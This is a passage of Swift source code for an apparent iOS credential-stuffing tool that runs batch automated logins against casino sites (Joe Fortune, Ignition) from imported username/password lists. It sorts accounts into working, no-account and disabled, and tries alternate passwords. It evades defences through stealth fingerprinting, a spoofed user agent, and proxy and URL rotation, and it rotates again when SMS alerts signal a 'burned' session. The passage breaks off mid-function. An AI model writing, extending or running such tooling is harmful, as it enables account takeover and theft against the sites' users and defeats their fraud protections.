import Foundation
import Observation
import SwiftUI

@Observable
@MainActor
class LoginViewModel {
    static let shared = LoginViewModel()

    var credentials: [LoginCredential] = []
    var attempts: [LoginAttempt] = []
    var isRunning: Bool = false
    var isPaused: Bool = false
    var isStopping: Bool = false
    var pauseCountdown: Int = 0
    private var pauseCountdownTask: Task<Void, Never>?
    var globalLogs: [PPSRLogEntry] = []
    var connectionStatus: ConnectionStatus = .disconnected
    var activeTestCount: Int = 0
    var maxConcurrency: Int = 4
    var debugMode: Bool = false
    var stealthEnabled: Bool = true
    var targetSite: LoginTargetSite = .joefortune
    var appearanceMode: AppAppearanceMode = .dark
    var testTimeout: TimeInterval = 90
    var showBatchResultPopup: Bool = false
    var lastBatchResult: BatchResult?
    var consecutiveUnusualFailures: Int = 0
    var batchTotalCount: Int = 0
    var batchCompletedCount: Int = 0
    var batchProgress: Double {
        guard batchTotalCount > 0 else { return 0 }
        return Double(batchCompletedCount) / Double(batchTotalCount)
    }
    var batchSuccessCount: Int = 0
    var batchFailCount: Int = 0
    var batchStartTime: Date?
    var batchSiteLabel: String = ""
    var autoRetryEnabled: Bool = true
    var autoRetryMaxAttempts: Int = 3
    private var autoRetryBackoffCounts: [String: Int] = [:]
    var consecutiveConnectionFailures: Int = 0
    var debugScreenshots: [PPSRDebugScreenshot] = []
    var fingerprintPassRate: String { FingerprintValidationService.shared.formattedPassRate }
    var fingerprintAvgScore: Double { FingerprintValidationService.shared.averageScore }
    var fingerprintHistory: [FingerprintValidationService.FingerprintScore] { FingerprintValidationService.shared.scoreHistory }
    var lastFingerprintScore: FingerprintValidationService.FingerprintScore? { FingerprintValidationService.shared.lastScore }
    var doubleSiteMode: Bool = false
    var siteMode: SiteMode = .joe
    var savedCropRect: CGRect? = nil
    var automationSettings: AutomationSettings = AutomationSettings()
    var isSlowDebugModeEnabled: Bool {
        automationSettings.slowDebugMode
    }
    var effectiveMaxConcurrency: Int {
        isSlowDebugModeEnabled ? 1 : maxConcurrency
    }

    nonisolated enum SiteMode: String, CaseIterable, Sendable {
        case joe = "Joe"
        case double = "Double"
        case ignition = "Ignition"
    }

    let urlRotation = LoginURLRotationService.shared
    let proxyService = ProxyRotationService.shared
    let blacklistService = BlacklistService.shared
    let disabledCheckService = DisabledCheckService.shared

    var isIgnitionMode: Bool {
        get { urlRotation.isIgnitionMode }
        set {
            urlRotation.isIgnitionMode = newValue
            targetSite = newValue ? .ignition : .joefortune
            persistSettings()
        }
    }

    func setSiteMode(_ mode: SiteMode) {
        siteMode = mode
        switch mode {
        case .joe:
            isIgnitionMode = false
            doubleSiteMode = false
        case .double:
            doubleSiteMode = true
        case .ignition:
            isIgnitionMode = true
            doubleSiteMode = false
        }
        persistSettings()
    }

    var effectiveColorScheme: ColorScheme? {
        if isIgnitionMode {
            return .dark
        }
        return appearanceMode.colorScheme
    }


    nonisolated enum ConnectionStatus: String, Sendable {
        case disconnected = "Disconnected"
        case connecting = "Connecting"
        case connected = "Connected"
        case error = "Error"
    }

    private let engine = LoginAutomationEngine()
    private let secondaryEngine = LoginAutomationEngine()
    private let persistence = LoginPersistenceService.shared
    private let notifications = PPSRNotificationService.shared
    private let logger = DebugLogger.shared
    private let backgroundService = BackgroundTaskService.shared
    private let recoveryService = SessionRecoveryService.shared
    private var batchTask: Task<Void, Never>?
    private var secondaryBatchTask: Task<Void, Never>?
    private var settingsSaveTask: Task<Void, Never>?
    private var credentialsSaveTask: Task<Void, Never>?
    private var heartbeatTask: Task<Void, Never>?
    private var connectionTestTask: Task<Void, Never>?
    private var forceStopTask: Task<Void, Never>?
    private var sessionHeartbeatTimeout: TimeInterval {
        TimeoutResolver.resolveHeartbeatTimeout(max(90, testTimeout))
    }

    init() {
        engine.onScreenshot = { [weak self] screenshot in
            guard let self else { return }
            self.addScreenshot(screenshot)
        }
        engine.onPurgeScreenshots = { [weak self] _ in
            _ = self
        }
        engine.onConnectionFailure = { [weak self] detail in
            self?.notifications.sendConnectionFailure(detail: detail)
        }
        engine.onUnusualFailure = { [weak self] detail in
            guard let self else { return }
            self.consecutiveUnusualFailures += 1
            let retrying = self.autoRetryEnabled
            NoticesService.shared.addNotice(
                message: detail,
                source: .login,
                autoRetried: retrying
            )
            self.log("Unusual failure: \(detail)\(retrying ? " — auto-retry queued" : "")", level: .warning)
        }
        engine.onLog = { [weak self] message, level in
            self?.log(message, level: level)
        }
        engine.onURLFailure = { [weak self] urlString in
            self?.urlRotation.reportFailure(urlString: urlString)
            self?.log("URL disabled after failures: \(urlString)", level: .warning)
        }
        engine.onURLSuccess = { [weak self] urlString in
            self?.urlRotation.reportSuccess(urlString: urlString)
        }
        engine.onResponseTime = { [weak self] urlString, duration in
            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
        }
        engine.onBlankScreenshot = { [weak self] urlString in
            guard let self else { return }
            self.urlRotation.reportFailure(urlString: urlString)
            self.log("Blank screenshot on \(URL(string: urlString)?.host ?? urlString) — URL marked failed, next test uses different URL", level: .warning)
        }

        secondaryEngine.onScreenshot = { [weak self] screenshot in
            guard let self else { return }
            self.addScreenshot(screenshot)
        }
        secondaryEngine.onPurgeScreenshots = { [weak self] _ in
            _ = self
        }
        secondaryEngine.onLog = { [weak self] message, level in
            self?.log("[DOUBLE] \(message)", level: level)
        }
        secondaryEngine.onURLFailure = { [weak self] urlString in
            self?.urlRotation.reportFailure(urlString: urlString)
        }
        secondaryEngine.onURLSuccess = { [weak self] urlString in
            self?.urlRotation.reportSuccess(urlString: urlString)
        }
        secondaryEngine.onResponseTime = { [weak self] urlString, duration in
            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
        }
        secondaryEngine.onBlankScreenshot = { [weak self] urlString in
            guard let self else { return }
            self.urlRotation.reportFailure(urlString: urlString)
            self.log("[DOUBLE] Blank screenshot on \(URL(string: urlString)?.host ?? urlString) — URL marked failed, rotating", level: .warning)
        }

        notifications.requestPermission()
        loadPersistedData()
        loadAutomationSettings()
        restoreTestQueueIfNeeded()
    }

    private func loadPersistedData() {
        credentials = persistence.loadCredentials()
        if let settings = persistence.loadSettings() {
            if let site = LoginTargetSite(rawValue: settings.targetSite) {
                targetSite = site
            }
            maxConcurrency = settings.maxConcurrency
            debugMode = settings.debugMode
            if let mode = AppAppearanceMode(rawValue: settings.appearanceMode) {
                appearanceMode = mode
            }
            stealthEnabled = settings.stealthEnabled
            testTimeout = max(settings.testTimeout, AutomationSettings.minimumTimeoutSeconds)
        }
        loadCropRect()
        if !credentials.isEmpty {
            log("Restored \(credentials.count) credentials from storage")
        }
    }

    private func restoreTestQueueIfNeeded() {
        if let recoveredBatch = recoveryService.recoverBatch() {
            let snapshots = recoveredBatch.snapshots
            var restoredCount = 0
            for snap in snapshots {
                if let cred = credentials.first(where: { $0.id == snap.credentialId }), cred.status == .testing {
                    cred.status = .untested
                    restoredCount += 1
                }
            }
            if restoredCount > 0 {
                log("Recovery: restored \(restoredCount) interrupted test(s) with rich snapshots (network: \(snapshots.first?.networkMode ?? "?"), failures: \(snapshots.compactMap(\.lastFailureReason).count))", level: .warning)
                persistCredentials()
            }
            return
        }

        guard let queuedIds = persistence.loadTestQueue(), !queuedIds.isEmpty else { return }
        let idSet = Set(queuedIds)
        var restoredCount = 0
        for cred in credentials where idSet.contains(cred.id) {
            if cred.status == .testing {
                cred.status = .untested
                restoredCount += 1
            }
        }
        persistence.clearTestQueue()
        if restoredCount > 0 {
            log("Restored \(restoredCount) interrupted test(s) back to queue", level: .warning)
            persistCredentials()
        }
    }

    func persistCredentials() {
        credentialsSaveTask?.cancel()
        credentialsSaveTask = Task {
            try? await Task.sleep(for: .milliseconds(500))
            guard !Task.isCancelled else { return }
            persistence.saveCredentials(credentials)
        }
    }

    func persistCredentialsNow() {
        credentialsSaveTask?.cancel()
        credentialsSaveTask = nil
        persistence.saveCredentials(credentials)
    }

    func persistSettings() {
        settingsSaveTask?.cancel()
        settingsSaveTask = Task {
            try? await Task.sleep(for: .milliseconds(300))
            guard !Task.isCancelled else { return }
            persistence.saveSettings(
                targetSite: targetSite.rawValue,
                maxConcurrency: maxConcurrency,
                debugMode: debugMode,
                appearanceMode: appearanceMode.rawValue,
                stealthEnabled: stealthEnabled,
                testTimeout: testTimeout
            )
        }
    }

    private let automationSettingsKey = "automation_settings_v1"

    func persistAutomationSettings() {
        automationSettings = automationSettings.normalizedTimeouts()
        if let data = try? JSONEncoder().encode(automationSettings) {
            UserDefaults.standard.set(data, forKey: automationSettingsKey)
        }
        syncAutomationSettingsToEngine()
    }

    private func loadAutomationSettings() {
        if let data = UserDefaults.standard.data(forKey: automationSettingsKey),
           let loaded = try? JSONDecoder().decode(AutomationSettings.self, from: data) {
            automationSettings = loaded.normalizedTimeouts()
        }
        syncAutomationSettingsToEngine()
    }

    private func syncAutomationSettingsToEngine() {
        automationSettings = automationSettings.normalizedTimeouts()
        maxConcurrency = automationSettings.maxConcurrency
        PPSRStealthService.shared.applySettings(automationSettings)
        engine.automationSettings = automationSettings
        secondaryEngine.automationSettings = automationSettings
    }

    func flowAssignment(for urlString: String) -> URLFlowAssignment? {
        automationSettings.urlFlowAssignments.first { assignment in
            urlString.localizedStandardContains(assignment.urlPattern) ||
            assignment.urlPattern.localizedStandardContains(urlString)
        }
    }

    func saveCropRect(_ rect: CGRect) {
        savedCropRect = rect
        let dict: [String: Double] = [
            "x": rect.origin.x,
            "y": rect.origin.y,
            "w": rect.size.width,
            "h": rect.size.height,
        ]
        UserDefaults.standard.set(dict, forKey: "login_crop_rect_v1")
        log("Saved crop region: \(Int(rect.origin.x)),\(Int(rect.origin.y)) \(Int(rect.width))x\(Int(rect.height))")
    }

    func clearCropRect() {
        savedCropRect = nil
        UserDefaults.standard.removeObject(forKey: "login_crop_rect_v1")
        log("Cleared crop region")
    }

    private func loadCropRect() {
        guard let dict = UserDefaults.standard.dictionary(forKey: "login_crop_rect_v1"),
              let x = dict["x"] as? Double,
              let y = dict["y"] as? Double,
              let w = dict["w"] as? Double,
              let h = dict["h"] as? Double else { return }
        savedCropRect = CGRect(x: x, y: y, width: w, height: h)
    }

    func syncFromiCloud() {
        if let synced = persistence.syncFromiCloud() {
            let existingUsernames = Set(credentials.map(\.username))
            var added = 0
            for cred in synced where !existingUsernames.contains(cred.username) {
                credentials.append(cred)
                added += 1
            }
            if added > 0 {
                log("iCloud sync: merged \(added) new credentials", level: .success)
                persistCredentials()
            } else {
                log("iCloud sync: no new credentials found", level: .info)
            }
        }
    }

    var workingCredentials: [LoginCredential] { credentials.filter { $0.status == .working } }
    var noAccCredentials: [LoginCredential] { credentials.filter { $0.status == .noAcc } }
    var permDisabledCredentials: [LoginCredential] { credentials.filter { $0.status == .permDisabled } }
    var tempDisabledCredentials: [LoginCredential] { credentials.filter { $0.status == .tempDisabled } }
    var unsureCredentials: [LoginCredential] { credentials.filter { $0.status == .unsure } }
    var untestedCredentials: [LoginCredential] { credentials.filter { $0.status == .untested } }
    var testingCredentials: [LoginCredential] { credentials.filter { $0.status == .testing } }

    let tempDisabledService = TempDisabledCheckService.shared
    var activeAttempts: [LoginAttempt] { attempts.filter { !$0.status.isTerminal } }
    var completedAttempts: [LoginAttempt] { attempts.filter { $0.status == .completed } }
    var failedAttempts: [LoginAttempt] { attempts.filter { $0.status == .failed } }

    func getNextTestURL() -> URL {
        if let rotatedURL = urlRotation.nextURL() {
            return rotatedURL
        }
        return targetSite.url
    }

    func getNextTestURL(forSite site: LoginTargetSite) -> URL {
        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = (site == .ignition)
        let url = urlRotation.nextURL() ?? site.url
        urlRotation.isIgnitionMode = wasIgnition
        return url
    }

    func testConnection() async {
        connectionTestTask?.cancel()
        let task = Task { await _testConnection() }
        connectionTestTask = task
        await task.value
    }

    private func _testConnection() async {
        connectionStatus = .connecting
        let testURL = getNextTestURL()
        log("Testing connection to \(testURL.host ?? "unknown")...")

        let currentTarget: ProxyRotationService.ProxyTarget = isIgnitionMode ? .ignition : .joe
        let currentMode = proxyService.connectionMode(for: currentTarget)
        log("Using \(currentTarget.rawValue) network mode: \(currentMode.label)")

        let config = URLSessionConfiguration.ephemeral
        config.timeoutIntervalForRequest = TimeoutResolver.resolveRequestTimeout(15)
        config.timeoutIntervalForResource = TimeoutResolver.resolveResourceTimeout(20)
        config.waitsForConnectivity = false

        if automationSettings.useAssignedNetworkForTests && currentMode == .proxy {
            if let proxy = proxyService.nextWorkingProxy(for: currentTarget) {
                var proxyDict: [String: Any] = [
                    "SOCKSEnable": true,
                    "SOCKSProxy": proxy.host,
                    "SOCKSPort": proxy.port,
                ]
                if let user = proxy.username, let pass = proxy.password {
                    proxyDict["SOCKSUser"] = user
                    proxyDict["SOCKSPassword"] = pass
                }
                config.connectionProxyDictionary = proxyDict
                log("Connection test via proxy: \(proxy.displayString)")
            }
        }

        let urlSession = URLSession(configuration: config)
        defer { urlSession.invalidateAndCancel() }

        var request = URLRequest(url: testURL, cachePolicy: .reloadIgnoringLocalAndRemoteCacheData, timeoutInterval: TimeoutResolver.resolveRequestTimeout(15))
        request.httpMethod = "GET"
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml", forHTTPHeaderField: "Accept")

        var httpOK = false
        do {
            let (data, response) = try await urlSession.data(for: request)
            if let http = response as? HTTPURLResponse {
                if http.statusCode >= 200 && http.statusCode < 400 {
                    httpOK = true
                    consecutiveConnectionFailures = 0
                    urlRotation.reportSuccess(urlString: testURL.absoluteString)
                    log("HTTP OK — \(http.statusCode) (\(data.count) bytes)", level: .success)
                } else {
                    connectionStatus = .error
                    urlRotation.reportFailure(urlString: testURL.absoluteString)
                    log("Connection failed — HTTP \(http.statusCode)", level: .error)
                    return
                }
            }
        } catch let error as NSError {
            connectionStatus = .error
            consecutiveConnectionFailures += 1
            urlRotation.reportFailure(urlString: testURL.absoluteString)
            let detail: String
            if error.domain == NSURLErrorDomain {
                switch error.code {
                case NSURLErrorNotConnectedToInternet: detail = "No internet connection"
                case NSURLErrorTimedOut: detail = "Connection timed out (\(Int(AutomationSettings.minimumTimeoutSeconds))s)"
                case NSURLErrorCannotFindHost: detail = "DNS failed for \(testURL.host ?? "")"
                case NSURLErrorCannotConnectToHost: detail = "Cannot connect to \(testURL.host ?? "")"
                case NSURLErrorNetworkConnectionLost: detail = "Network connection lost"
                case NSURLErrorSecureConnectionFailed: detail = "SSL/TLS handshake failed"
                default: detail = "Network error (\(error.code)): \(error.localizedDescription)"
                }
            } else {
                detail = error.localizedDescription
            }
            log("Connection failed: \(detail)", level: .error)

            if consecutiveConnectionFailures >= 3 {
                log("\(consecutiveConnectionFailures) consecutive failures — try switching networks or checking proxy settings", level: .error)
            }
            return
        }

        guard httpOK else {
            connectionStatus = .error
            return
        }

        let session = LoginSiteWebSession(targetURL: testURL)
        session.stealthEnabled = stealthEnabled
        session.setUp(wipeAll: true)

        let loaded = await session.loadPage(timeout: TimeoutResolver.resolvePageLoadTimeout(20))
        if loaded {
            let verification = await session.verifyLoginFieldsExist()
            if verification.found == 2 {
                connectionStatus = .connected
                log("WebView verification: both login fields found", level: .success)
            } else {
                connectionStatus = .connected
                log("WebView verification: \(verification.found)/2 fields. Missing: \(verification.missing.joined(separator: ", "))", level: .warning)
            }
        } else {
            connectionStatus = .connected
            let errorDetail = session.lastNavigationError ?? "unknown"
            log("WebView page load failed (\(errorDetail)) — HTTP works but WKWebView could not render", level: .warning)
        }
        session.tearDown(wipeAll: true)
    }

    func smartImportCredentials(_ input: String) {
        logger.log("Smart import started (\(input.count) chars)", category: .persistence, level: .info)
        let parsed = LoginCredential.smartParse(input)
        let lines = input.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }

        if parsed.isEmpty && !lines.isEmpty {
            for line in lines {
                log("Could not parse: \(line)", level: .warning)
            }
            return
        }

        let permDisabledUsernames = Set(permDisabledCredentials.map(\.username))

        var added = 0
        var skippedBlacklist = 0
        for cred in parsed {
            if permDisabledUsernames.contains(cred.username) {
                log("Skipped perm disabled: \(cred.username)", level: .warning)
                continue
            }
            if blacklistService.isBlacklisted(cred.username) {
                skippedBlacklist += 1
                continue
            }
            let isDuplicate = credentials.contains { $0.username == cred.username }
            if isDuplicate {
                log("Skipped duplicate: \(cred.username)", level: .warning)
            } else {
                credentials.append(cred)
                added += 1
            }
        }

        if skippedBlacklist > 0 {
            log("Skipped \(skippedBlacklist) blacklisted credential(s)", level: .warning)
        }

        if parsed.count > 0 {
            log("Smart import: \(added) added from \(parsed.count) parsed (\(lines.count) lines)", level: .success)
            logger.log("Credential import: \(added) added, \(skippedBlacklist) blacklisted, from \(parsed.count) parsed", category: .persistence, level: .success)
        }
        persistCredentials()
    }

    func deleteCredential(_ cred: LoginCredential) {
        credentials.removeAll { $0.id == cred.id }
        log("Removed credential: \(cred.username)")
        persistCredentials()
    }

    func restoreCredential(_ cred: LoginCredential) {
        cred.status = .untested
        log("Restored \(cred.username) to untested")
        persistCredentials()
    }

    func purgePermDisabledCredentials() {
        let count = permDisabledCredentials.count
        credentials.removeAll { $0.status == .permDisabled }
        log("Purged \(count) perm disabled credential(s)")
        persistCredentials()
    }

    func purgeNoAccCredentials() {
        let count = noAccCredentials.count
        credentials.removeAll { $0.status == .noAcc }
        log("Purged \(count) no-acc credential(s)")
        persistCredentials()
    }

    func purgeUnsureCredentials() {
        let count = unsureCredentials.count
        credentials.removeAll { $0.status == .unsure }
        log("Purged \(count) unsure credential(s)")
        persistCredentials()
    }

    func testSingleCredential(_ cred: LoginCredential) {
        guard !isRunning || activeTestCount < effectiveMaxConcurrency else {
            log("Max concurrency reached", level: .warning)
            return
        }

        if blacklistService.isBlacklisted(cred.username) {
            cred.status = .permDisabled
            log("\(cred.username) — BLOCKED: blacklisted, skipping test", level: .warning)
            persistCredentials()
            return
        }

        cred.status = .testing
        let attempt = LoginAttempt(credential: cred, sessionIndex: activeTestCount + 1)
        attempts.insert(attempt, at: 0)

        Task {
            configureEngine()
            isRunning = true
            activeTestCount += 1
            let testURL = getNextTestURL()
            let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
            activeTestCount -= 1
            handleOutcome(outcome, credential: cred, attempt: attempt)
            if activeTestCount == 0 { isRunning = false }
            persistCredentials()
        }
    }

    private func configureEngine() {
        engine.debugMode = debugMode
        engine.stealthEnabled = stealthEnabled
        engine.automationSettings = automationSettings
        engine.proxyTarget = .joe
        secondaryEngine.debugMode = debugMode
        secondaryEngine.stealthEnabled = stealthEnabled
        secondaryEngine.automationSettings = automationSettings
        secondaryEngine.proxyTarget = .ignition
    }

    private func handleOutcome(_ outcome: LoginOutcome, credential: LoginCredential, attempt: LoginAttempt) {
        let duration = attempt.duration ?? 0
        let reviewQueue = ReviewQueueService.shared
        let confidence = attempt.confidenceScore ?? 1.0

        if reviewQueue.shouldRouteToReview(outcome: outcome, confidence: confidence) {
            attempt.routedToReview = true
            reviewQueue.addItem(
                credentialId: credential.id,
                username: credential.username,
                password: credential.password,
                suggestedOutcome: outcome,
                confidence: confidence,
                signalBreakdown: attempt.confidenceSignals,
                reasoning: attempt.confidenceReasoning ?? "No reasoning available",
                screenshotIds: attempt.screenshotIds,
                logs: attempt.logs,
                testedURL: attempt.detectedURL ?? "",
                networkMode: attempt.networkModeLabel ?? "unknown",
                vpnServer: attempt.assignedVPNServer,
                vpnIP: attempt.assignedVPNIP,
                replayLog: attempt.replayLog
            )
            credential.status = .unsure
            log("\(credential.username) — ROUTED TO REVIEW (confidence \(String(format: "%.0f%%", confidence * 100)), suggested: \(outcome))", level: .warning)
            return
        }

        switch outcome {
        case .success:
            credential.recordResult(success: true, duration: duration)
            log("\(credential.username) — LOGIN SUCCESS (\(attempt.formattedDuration))", level: .success)
            consecutiveUnusualFailures = 0

        case .noAcc:
            credential.recordFullLoginAttempt()
            let minAttempts = automationSettings.minAttemptsBeforeNoAcc
            if credential.fullLoginAttemptCount < minAttempts && !credential.accountConfirmedViaTempDisabled {
                credential.status = .untested
                requeueCredentialToBottom(credential)
                log("\(credential.username) — incorrect password but only \(credential.fullLoginAttemptCount)/\(minAttempts) attempts — requeuing for confirmation", level: .warning)
            } else {
                credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "no account")
                log("\(credential.username) — NO ACC: \(credential.fullLoginAttemptCount) attempts with no temp disabled — confirmed no account", level: .error)
                if blacklistService.autoBlacklistNoAcc {
                    blacklistService.addToBlacklist(credential.username, reason: "Auto: no account after \(credential.fullLoginAttemptCount) attempts")
                    log("\(credential.username) — auto-added to blacklist (no acc)", level: .warning)
                }
            }
            consecutiveUnusualFailures = 0

        case .permDisabled:
            credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "permanently disabled")
            log("\(credential.username) — PERM DISABLED", level: .error)
            consecutiveUnusualFailures = 0
            blacklistService.addToBlacklist(credential.username, reason: "Auto: perm disabled")
            log("\(credential.username) — auto-added to blacklist (perm disabled)", level: .warning)

        case .tempDisabled:
            credential.recordFullLoginAttempt()
            credential.confirmAccountExists()
            credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "temporarily disabled")
            log("\(credential.username) — ACCOUNT CONFIRMED — temp disabled means account exists", level: .warning)
            if !credential.assignedPasswords.isEmpty && credential.nextPasswordIndex < credential.assignedPasswords.count {
                log("\(credential.username) — has \(credential.untestedPasswordCount) untested password(s) — queued for alt password retry", level: .info)
            }
            consecutiveUnusualFailures = 0

        case .redBannerError:
            credential.status = .untested
            let redEntry = RequeuePriorityService.shared.prioritize(credentialId: credential.id, username: credential.username, outcome: outcome)
            let redDetCount = RequeuePriorityService.shared.detectionCount(for: credential.id)
            let _ = proxyService.nextWorkingProxy(for: isIgnitionMode ? .ignition : .joe)
            if let detURL = attempt.detectedURL, !detURL.isEmpty {
                urlRotation.reportFailure(urlString: detURL)
            }
            if let entry = redEntry {
                requeueCredentialWithPriority(credential, entry: entry)
            } else {
                requeueCredentialToBottom(credential)
            }
            let cooldown = Int(RequeuePriorityService.shared.cooldownForOutcome(outcome))
            log("\(credential.username) — red banner error (\(redDetCount)x) — proxy+URL rotated, \(cooldown)s cooldown", level: .warning)

        case .smsDetected:
            credential.status = .untested
            let smsEntry = RequeuePriorityService.shared.prioritize(credentialId: credential.id, username: credential.username, outcome: outcome)
            let smsDetCount = RequeuePriorityService.shared.detectionCount(for: credential.id)
            let _ = proxyService.nextWorkingProxy(for: isIgnitionMode ? .ignition : .joe)
            if let detURL = attempt.detectedURL, !detURL.isEmpty {
                urlRotation.reportFailure(urlString: detURL)
            }
            if let entry = smsEntry {
                requeueCredentialWithPriority(credential, entry: entry)
            } else {
                requeueCredentialToBottom(credential)
            }
            let cooldown = Int(RequeuePriorityService.shared.cooldownForOutcome(outcome))
            log("\(credential.username) — SMS notification (\(smsDetCount)x) — session burned, proxy+URL rotated, \(cooldown)s cooldown", level: .warning)

        case .unsure, .timeout, .connectionFailure:
            if outcome == .unsure {
                credential.recordFullLoginAttempt()
            }
            credential.status = .untested
            if outcome == .connectionFailure {
                consecutiveConnectionFailures += 1
            }
            let entry = RequeuePriorityService.shared.prioritize(credentialId: credential.id, username: credential.username, outcome: outcome)
            let reason: String
            switch outcome {
            case .timeout: reason = "timeout (\(Int(testTimeout))s combined)"
            case .connectionFailure: reason = "connection failure"
            default: reason = "unsure result (attempt \(credential.fullLoginAttemptCount))"
            }
            if let entry {
                requeueCredentialWithPriority(credential, entry: entry)
                log("\(credential.username) — requeued with \(entry.priority) priority (\(reason))", level: .warning)
            } else {
                log("\(credential.username) — max requeue reached, not requeuing (\(reason))", level: .error)
            }
        }
    }

    func testSelectedCredentials(ids: Set<String>) {
        let credsToTest = credentials.filter { ids.contains($0.id) && $0.status == .untested }
        guard !credsToTest.isEmpty else {
            log("No matching untested credentials to test", level: .warning)
            return
        }
        isPaused = false
        isStopping = false
        autoRetryBackoffCounts.removeAll()
        log("Starting selective batch: \(credsToTest.count) credentials")
        logger.log("BATCH START (selective): \(credsToTest.count) creds, concurrency=\(effectiveMaxConcurrency)", category: .login, level: .info)
        testSingleSiteBatch(credsToTest)
    }

    func testAllUntested() {
        let groupService = CredentialGroupService.shared
        let credsToTest: [LoginCredential]
        if let groupIds = groupService.credentialIdsForActiveGroup() {
            let idSet = Set(groupIds)
            credsToTest = credentials.filter { idSet.contains($0.id) && $0.status == .untested }
            if credsToTest.isEmpty {
                log("No untested credentials in active group", level: .warning)
                return
            }
            log("Testing group: \(credsToTest.count) untested from group", level: .info)
        } else {
            credsToTest = untestedCredentials
            guard !credsToTest.isEmpty else {
                log("No untested credentials in queue", level: .warning)
                return
            }
        }

        isPaused = false
        isStopping = false
        autoRetryBackoffCounts.removeAll()

        if doubleSiteMode {
            log("Starting DOUBLE-SITE batch: \(credsToTest.count) creds, Joe + Ignition simultaneously")
            logger.log("BATCH START (double): \(credsToTest.count) creds, concurrency=\(effectiveMaxConcurrency), stealth=\(stealthEnabled)", category: .login, level: .info, metadata: ["mode": "double", "count": "\(credsToTest.count)"])
            testDoubleSite(credsToTest)
        } else {
            log("Starting batch test: \(credsToTest.count) credentials, max \(effectiveMaxConcurrency) concurrent, stealth: \(stealthEnabled ? "ON" : "OFF")")
            logger.log("BATCH START: \(credsToTest.count) creds, concurrency=\(effectiveMaxConcurrency), stealth=\(stealthEnabled), site=\(targetSite.rawValue)", category: .login, level: .info, metadata: ["mode": "single", "count": "\(credsToTest.count)", "site": targetSite.rawValue])
            testSingleSiteBatch(credsToTest)
        }
    }

    private func testSingleSiteBatch(_ credsToTest: [LoginCredential]) {
        batchTask?.cancel()
        secondaryBatchTask?.cancel()
        isRunning = true
        batchTotalCount = credsToTest.count
        batchCompletedCount = 0
        batchSuccessCount = 0
        batchFailCount = 0
        batchStartTime = Date()
        batchSiteLabel = isIgnitionMode ? "Ignition" : "Joe"
        startHeartbeatMonitor()
        DeviceProxyService.shared.notifyBatchStart()
        backgroundService.beginExtendedBackgroundExecution(reason: "Login batch test")
        persistence.saveTestQueue(credentialIds: credsToTest.map(\.id))
        let batchURL = getNextTestURL()
        recoveryService.beginBatch(credentials: credsToTest, siteMode: siteMode.rawValue, targetURL: batchURL)
        var batchWorking = 0
        var batchDead = 0
        var batchRequeued = 0

        batchTask = Task {
            configureEngine()
            await withTaskGroup(of: Void.self) { group in
                let concurrencyLimit = effectiveMaxConcurrency
                var running = 0

                for cred in credsToTest {
                    guard !Task.isCancelled && !isStopping else { break }

                    if CrashProtectionService.shared.isMemoryEmergency {
                        self.log("Memory EMERGENCY during login batch — auto-stopping to prevent crash", level: .error)
                        self.isStopping = true
                        break
                    }

                    if !CrashProtectionService.shared.isMemorySafeForNewSession {
                        self.log("Memory pressure — waiting before spawning next login session", level: .warning)
                        let recovered = await CrashProtectionService.shared.waitForMemoryToDrop(timeout: 15)
                        if !recovered || Task.isCancelled {
                            self.isStopping = true
                            break
                        }
                    }

                    while isPaused && !isStopping && !Task.isCancelled {
                        try? await Task.sleep(for: .milliseconds(500))
                    }

                    guard !Task.isCancelled && !isStopping else { break }

                    if running >= concurrencyLimit {
                        await group.next()
                        running -= 1
                    }

                    running += 1
                    cred.status = .testing
                    let sessionIdx = running

                    let attempt = LoginAttempt(credential: cred, sessionIndex: sessionIdx)
                    attempts.insert(attempt, at: 0)
                    activeTestCount += 1
                    trimAttemptsIfNeeded()

                    let testURL = getNextTestURL()

                    group.addTask { [engine, testTimeout] in
                        defer {
                            Task { @MainActor in
                                self.activeTestCount = max(0, self.activeTestCount - 1)
                            }
                        }
                        let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
                        await MainActor.run {
                            self.batchCompletedCount += 1
                            self.handleOutcome(outcome, credential: cred, attempt: attempt)
                            self.updateRecoveryForOutcome(outcome, credential: cred, attempt: attempt)

                            if cred.status == .untested {
                                batchRequeued += 1
                            } else if outcome == .success {
                                batchWorking += 1
                                self.batchSuccessCount += 1
                            } else {
                                batchDead += 1
                                self.batchFailCount += 1
                            }

                            self.persistCredentials()
                        }
                    }
                }

                await group.waitForAll()
            }

            syncActiveTestCount()
            finalizeBatch(working: batchWorking, dead: batchDead, requeued: batchRequeued)
        }
    }

    private func testDoubleSite(_ credsToTest: [LoginCredential]) {
        batchTask?.cancel()
        secondaryBatchTask?.cancel()
        isRunning = true
        let doubledTotal = credsToTest.count * 2
        batchTotalCount = doubledTotal
        batchCompletedCount = 0
        batchSuccessCount = 0
        batchFailCount = 0
        batchStartTime = Date()
        batchSiteLabel = "Double"
        startHeartbeatMonitor()
        DeviceProxyService.shared.notifyBatchStart()
        backgroundService.beginExtendedBackgroundExecution(reason: "Login double-site batch test")
        persistence.saveTestQueue(credentialIds: credsToTest.map(\.id))
        let doubleBatchURL = getNextTestURL()
        recoveryService.beginBatch(credentials: credsToTest, siteMode: "Double", targetURL: doubleBatchURL)

        let doubledConcurrency = max(4, effectiveMaxConcurrency * 2)
        let joeSlots = doubledConcurrency / 2
        let ignSlots = doubledConcurrency - joeSlots

        log("Double Mode: ALL \(credsToTest.count) creds on BOTH sites (\(doubledTotal) total tests), Joe=\(joeSlots) slots, Ign=\(ignSlots) slots")
        logger.log("DOUBLE MODE: \(credsToTest.count) creds × 2 sites = \(doubledTotal) tests, concurrency=\(doubledConcurrency)", category: .login, level: .info)

        if !automationSettings.trueDetectionEnabled || !automationSettings.trueDetectionPriority {
            automationSettings.trueDetectionEnabled = true
            automationSettings.trueDetectionPriority = true
            persistAutomationSettings()
